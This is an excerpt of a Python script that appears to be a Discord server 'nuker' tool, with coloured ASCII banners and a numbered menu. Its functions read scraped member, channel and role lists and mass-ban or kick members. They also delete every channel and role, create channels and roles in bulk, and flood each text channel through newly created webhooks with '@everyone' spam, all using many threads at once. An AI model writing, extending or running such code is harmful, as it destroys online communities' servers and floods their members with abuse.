...
print(f'''
                                             ...
                                             {Fore.LIGHTBLACK_EX}█████{colors.purple}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}╔══{Fore.LIGHTBLACK_EX}██{colors.purpley}╗╚════{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.purple}╚{Fore.LIGHTBLACK_EX}█████{colors.purple}╔╝{Fore.LIGHTBLACK_EX} █████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.purple}╔══{Fore.LIGHTBLACK_EX}██{colors.purple}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.purple}╚{Fore.LIGHTBLACK_EX}█████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
''')
...
class skid:
    ...
    def WebhookSend(self, webhook, message): #credits to anti
        while True:
            json = {
                'content': message if message != '' else "@everyone  Dusky Runs All",
                'tts': False,
                'username': '8300'
            }
    ...
    async def SpamWebhook(self, guild_id, amount, message):
        ...
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='run away', reason="8300")
    ...
    async def BanExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
    ...
    async def KickExecute(self):
        guild = input(f'{colors.gray}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.purple}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
    ...
    async def ChannelDeleteExecute(self):
        guild = input(f'{colors.gray}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.purple}')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
    ...
    async def RoleDeleteExecute(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.purple}')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
    ...
    async def ChannelSpamExecute(self):
        guild = input(f'{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.purple}')
        name = input(f"{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Role Name:: {Fore.purple}")
        amount = input(f"{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.purple}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{colors.purple}[{colors.gray}{Fore.purple}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        name = input(f"{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Role Name: {Fore.GREEN}")
        amount = input(f"{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purply}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} How Many?: {Fore.GREEN}")
        print()
        for i in range(int(amount)):
...
''')
    ...
    async def Menu(self):
        ...
        print(f'''
                                             {Fore.LIGHTBLACK_EX}█████{colors.purple}╗ {Fore.LIGHTBLACK_EX}██████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}╗ 
                                            ...
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.purple}╔══{Fore.LIGHTBLACK_EX}██{colors.purple}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██{colors.purple}
                                             {colors.purple}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

                                     ╔═════════════════════╗      ╔═══════════════════╗
                                     ║   discord.gg/skids  ║      ║   fuck the skids  ║
                                    ╔═══════════════════════╗   ╔═══════════════════════╗
        ...
        choice = input(f'{colors.purple}[{colors.purple}{Fore.purple}√{Fore.purple}{colors.purple}]{colors.purple} {Fore.purple}· {colors.purple}[{colors.purple}{Fore.purple}{ok}{Fore.purple}{colors.purple}] {colors.purple}[{colors.purple}{Fore.purple}Debug{Fore.purple}{colors.purple}] {Fore.purple} Number:{Fore.purple} {Fore.purple}')
        if choice == '1': #bans
